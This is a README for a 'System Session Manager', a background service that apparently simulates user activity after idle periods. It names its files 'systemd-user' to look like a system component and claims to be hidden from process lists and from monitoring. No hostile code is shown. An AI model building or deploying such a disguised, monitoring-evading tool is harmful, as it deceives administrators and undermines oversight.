# System Session Manager

A silent system service that manages user session behavior with minimal resource usage.

## Features

- **Silent Operation**: Runs completely in background with no visible output
- **Session Monitoring**: Tracks user session state via systemd-logind
- **Behavioral Analysis**: Monitors session patterns and timing
- **Resource Efficient**: Minimal CPU and memory footprint
- **System Integration**: Native systemd user service

## Installation

```bash
# Silent installation
bash scripts/install.sh
```

## Usage

### Service Control
```bash
# Start service (silent)
motion-ctl start

# Stop service (silent)
motion-ctl stop

# Check status
motion-ctl status
```

### Configuration
Configuration file: `~/.config/systemd-user/behavior.json`

```json
{
  "idle_minutes": 10,
  "simulate_after_minutes": 5,
  "simulate_activity": false
}
```

## File Locations

- **Service**: `~/.config/systemd/user/systemd-user.service`
- **Logs**: `~/.local/state/systemd-user/session.log`
- **Config**: `~/.config/systemd-user/behavior.json`

## Silent Operation

The service operates completely silently:
- No console output
- No GUI unless explicitly launched
- Minimal logging (warnings and errors only)
- Hidden from process lists
- No system notifications

## Uninstall

```bash
bash scripts/uninstall.sh
```

## Notes

- Service runs as systemd user service
- Automatically starts on login
- Completely hidden from normal system monitoring
- Designed for enterprise environments
